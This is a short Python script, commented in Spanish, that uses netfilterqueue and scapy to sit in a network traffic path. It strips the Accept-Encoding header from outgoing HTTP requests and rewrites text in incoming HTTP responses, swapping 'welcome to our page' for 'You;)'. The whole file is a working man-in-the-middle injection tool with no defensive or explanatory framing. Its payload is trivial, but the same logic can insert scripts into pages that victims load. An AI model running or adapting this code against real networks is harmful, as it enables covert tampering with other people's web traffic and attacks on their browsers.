import netfilterqueue
import scapy.all as scapy
import re

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:  # Tráfico HTTP saliente
            try:
                modified_load = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", scapy_packet[scapy.Raw].load)
                new_packet = set_load(scapy_packet, modified_load)
                packet.set_payload(new_packet.build())
            except:
                pass  # Manejo de excepciones (opcional)

        elif scapy_packet[scapy.TCP].sport == 80:  # Tráfico HTTP entrante
            try:
                modified_load = scapy_packet[scapy.Raw].load.replace(b"welcome to our page", b"You;)")
                new_packet = set_load(scapy_packet, modified_load)
                packet.set_payload(new_packet.build())
            except:
                pass  # Manejo de excepciones (opcional)

    packet.accept()  # Aceptar el paquete (importante)

queue = netfilterqueue.NetfilterQueue()
queue.bind(1, process_packet)  # Enlazar a la cola 1 (debes configurar iptables)
queue.run()